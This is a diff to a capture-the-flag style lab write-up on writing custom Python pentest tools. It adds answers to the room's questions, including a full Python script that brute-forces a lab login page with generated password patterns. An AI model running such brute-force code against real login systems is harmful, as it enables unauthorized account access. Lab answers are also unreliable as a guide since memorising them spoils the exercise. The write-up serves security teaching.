@@ -10,6 +10,10 @@ Code is the most versatile option, as it allows you to create brand new software
 
 While we will showcase using Python in this room, the principles can be applied to any coding language of your choice.
 
+Add `MACHINE_IP` to your hosts `/etc/hosts` file with the command `echo "MACHINE_IP python.thm" | sudo tee -a /etc/hosts`
+
+We will be using the web application running on this machine in the upcoming tasks.
+
 ## Using a Coding Language for Custom Tooling
 
 ### Why Create Your Own Tools?
@@ -91,6 +95,8 @@ Before we start coding, let's go over some essential functions and techniques us
 
 In order to understand the essence of custom tooling using Python, consider a web application hosted at `http://python.thm/labs/lab1`. Visit the application, and you will see the following login panel. 
 
+<img width="220" height="185" alt="image" src="https://github.com/user-attachments/assets/e64036ea-1dfa-461a-9556-3eda03a82dc2" />
+
 As a pentester, your task is to bypass the authentication mechanism and get access to the main dashboard. Suppose you discover that the username is `admin` and the password is a 4-digit numeric value from the system logs or the frontend. 
 
 One option is to manually try different combinations, but this is inefficient. A more viable approach is to use Python to automate the brute-force attack and try to attempt all possible 4-digit passwords.
@@ -131,3 +137,55 @@ brute_force()
 ### Executing the Script
 
 Navigate to the terminal and execute the following command python3 bruteforce.py. Upon execution, the script will try all possible 4-digit numeric passwords. Once it finds the correct password, it will display the valid credentials.
+
+<img width="233" height="148" alt="image" src="https://github.com/user-attachments/assets/b19d4403-7d8a-4b7c-813a-707368ac410f" />
+
+### Answer the questions below
+
+1. What is one of the renowned Python libraries used to send HTTP requests, interact with web applications, and analyse responses?
+
+Requests
+
+2. What is the flag value after logging in as admin? You can customise the code to iterate between 1200 and 1250.
+
+You can use the username as `admin` and password combination to get the flag.
+
+<img width="665" height="231" alt="image" src="https://github.com/user-attachments/assets/12b90417-c4ae-445b-be9f-80d602ca6a04" />
+
+3. Can you attempt to log in as Mark, whose password follows a specific pattern? His password consists of the first three characters as digits (000-999) followed by a single uppercase letter (A-Z). What is the flag value?
+
+Changing username from `admin` to `Mark` and `password_list` in the python code
+
+```
+import requests
+import string 
+
+url = "http://python.thm/labs/lab1/index.php"
+
+username = "Mark"
+
+# Generating 3-digit numeric with uppercase letter (000-999)(A-Z)
+password_list = [str(i).zfill(3) + letter for i in range(1000) for letter in string.ascii_uppercase]
+
+def brute_force():
+    for password in password_list:
+        data = {"username": username, "password": password}
+        response = requests.post(url, data=data)
+        
+        if "Invalid" not in response.text: 
+            print(f"[+] Found valid credentials: {username}:{password}")
+            break
+        else:
+            print(f"[-] Attempted: {password}")
+
+brute_force()
+```
+
+Run this code to get the right credentials and then use these credentials to get the flag.
+
+<img width="214" height="104" alt="image" src="https://github.com/user-attachments/assets/1513d9f6-822c-4375-9552-dfb989538858" />
+
+
+
+
+
